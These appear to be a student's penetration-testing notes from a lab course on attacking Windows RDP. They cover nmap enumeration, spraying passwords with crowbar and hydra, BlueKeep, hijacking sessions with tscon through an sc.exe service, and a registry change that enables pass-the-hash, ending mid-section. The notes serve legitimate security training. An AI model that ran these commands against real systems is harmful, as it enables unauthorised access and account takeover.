### Footprinting  RDP
```shell-session
agdy3660@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption:

|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS

```
Nmap can leave cookie traces that can be found by threat hunters and EDRs.

A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.
#### Initiate an RDP Session
connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina` and interact with the GUI of the server accordingly.
```shell-session
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```


Check pass pol before spraying rdp
```
nxc pass-pol
```
modify wordlists

run  crowbar
```shell-session
# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
with hydra
```shell-session
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

new rdp tool
```shell-session
# rdesktop -u admin -p password123 192.168.2.143
```
# Vulnerabilities (BLUEKEEP)
In 2019, a critical vulnerability was published in the RDP (`TCP/3389`) service that also led to remote code execution (`RCE`) with the identifier [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). This vulnerability is known as `BlueKeep`.

the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.

the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.

Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.

# PRIOR TO SERVER 2019
## Protocol Specific Attacks

#### RDP Session Hijacking
if we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account.

To successfully impersonate a user without their password, 
- we need to have `SYSTEM` privileges   
- specifying which `SESSION ID` (`4` for the `lewen` session in our example), to hjack
-  what session name were going to connect to  (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:	

examples:

```cmd-session
 query user
```

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

### With Admin Privileges (method of service running as SYSTEM)
If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, 
- we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.
```cmd-session
query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```


```cmd-session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
START THE SERVICE:
```cmd-session
net start sessionhijack
```
![[rdp_session-3-2.jpg|500]]
. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
_Note: This method no longer works on Server 2019._
## RDP Pass-the-Hash (PtH) 

### Restricted admin bypass
```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
